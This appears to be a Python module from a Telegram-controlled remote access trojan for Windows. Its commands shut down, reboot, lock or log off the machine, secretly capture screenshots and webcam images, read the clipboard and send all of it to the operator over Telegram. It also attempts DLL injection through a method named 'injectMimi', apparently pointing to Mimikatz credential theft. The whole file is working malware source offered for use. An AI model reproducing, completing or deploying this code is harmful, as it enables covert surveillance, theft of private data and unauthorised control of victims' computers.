# bot_modules/sys_operations.py

import os
import platform
import time
import ctypes
import cv2
import pyautogui
import telebot
import logging
import win32clipboard
from win_api_helper import call_zpoint_function

logger = logging.getLogger(__name__)

def split_message(text, max_length=4096):
    return [text[i:i + max_length] for i in range(0, len(text), max_length)]

class SysOperations:
    def __init__(self, bot: telebot.TeleBot, verify_telegram_id):
        self.bot = bot
        self.verify_telegram_id = verify_telegram_id

    def shutdown_system(self, message):
        if not self.verify_telegram_id(message.from_user.id):
            return
        try:
            if platform.system() == "Windows":
                # Requires appropriate privileges
                ctypes.windll.user32.ExitWindowsEx(0x00000008, 0x00000000)  # EWX_SHUTDOWN
            else:
                os.system("shutdown now")
            self.bot.reply_to(message, "[+] Shutting down system.")
        except Exception as e:
            self.bot.reply_to(message, f"[!] Error: {str(e)}")

    def restart_system(self, message):
        if not self.verify_telegram_id(message.from_user.id):
            return
        try:
            if platform.system() == "Windows":
                ctypes.windll.user32.ExitWindowsEx(0x00000002, 0x00000000)  # EWX_REBOOT
            else:
                os.system("reboot")
            self.bot.reply_to(message, "[+] Restarting system.")
        except Exception as e:
            self.bot.reply_to(message, f"[!] Error: {str(e)}")

    def lock_workstation(self, message):
        if not self.verify_telegram_id(message.from_user.id):
            return
        try:
            if platform.system() == "Windows":
                ctypes.windll.user32.LockWorkStation()
                self.bot.reply_to(message, "[+] Workstation locked.")
            else:
                self.bot.reply_to(message, "[!] Lock is only supported on Windows.")
        except Exception as e:
            self.bot.reply_to(message, f"[!] Error: {str(e)}")

    def logoff_user(self, message):
        if not self.verify_telegram_id(message.from_user.id):
            return
        try:
            if platform.system() == "Windows":
                ctypes.windll.user32.ExitWindowsEx(0x00000000, 0x00000000)  # EWX_LOGOFF
                self.bot.reply_to(message, "[+] Logging off the current user.")
            else:
                self.bot.reply_to(message, "[!] Logoff is only supported on Windows.")
        except Exception as e:
            self.bot.reply_to(message, f"[!] Error: {str(e)}")

    def take_screenshot(self, message):
        """Capture a screenshot and send it via Telegram."""
        if not self.verify_telegram_id(message.from_user.id):
            return
        try:
            screenshot = pyautogui.screenshot()
            timestamp = int(time.time())
            screenshot_path = f"{timestamp}_screenshot.png"
            screenshot.save(screenshot_path)
            with open(screenshot_path, "rb") as image_file:
                self.bot.send_photo(message.from_user.id, image_file)
            os.remove(screenshot_path)
        except Exception as e:
            self.bot.reply_to(message, f"[!] Error taking screenshot: {str(e)}")



    def webcam_capture(self, message):
        if not self.verify_telegram_id(message.from_user.id):
            return
        try:
            cap = cv2.VideoCapture(0)
            if not cap.isOpened():
                self.bot.reply_to(message, "[!] Could not open webcam.")
                return

            ret, frame = cap.read()
            if ret:
                timestamp = int(time.time())
                webcam_path = f"{timestamp}.png"
                cv2.imwrite(webcam_path, frame)
                with open(webcam_path, "rb") as image:
                    self.bot.send_photo(message.from_user.id, image)
                os.remove(webcam_path)
                logger.info(f"Webcam capture taken and sent: {webcam_path}")
            cap.release()
        except Exception as e:
            self.bot.reply_to(message, f"[!] Error: {str(e)}")

    def get_clipboard(self, message):
        if not self.verify_telegram_id(message.from_user.id):
            return
        try:
            win32clipboard.OpenClipboard()
            clipboard_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            for chunk in split_message(clipboard_data):
                self.bot.reply_to(message, chunk)
            logger.info("Clipboard data sent.")
        except Exception as e:
            self.bot.reply_to(message, f"[!] Error: {str(e)}")

    def clear_clipboard(self, message):
        if not self.verify_telegram_id(message.from_user.id):
            return
        try:
            win32clipboard.OpenClipboard()
            win32clipboard.EmptyClipboard()
            win32clipboard.CloseClipboard()
            self.bot.reply_to(message, "[+] Clipboard cleared.")
            logger.info("Clipboard cleared.")
        except Exception as e:
            self.bot.reply_to(message, f"[!] Error: {str(e)}")

    def injectMimi(self, message):
        if not self.verify_telegram_id(message.from_user.id):
            return
        # Example path to the DLL
        dll_path = r"C:\Users\MaGoG\Documents\test_directory\exampleDLL\x64\Release\exampleDLL.dll"
        try:
            call_zpoint_function(dll_path)
            self.bot.reply_to(message, f"[+] DLL injection attempted: {dll_path}")
            logger.info(f"DLL injection attempted: {dll_path}")
        except Exception as e:
            self.bot.reply_to(message, f"[!] Error during DLL injection: {str(e)}")
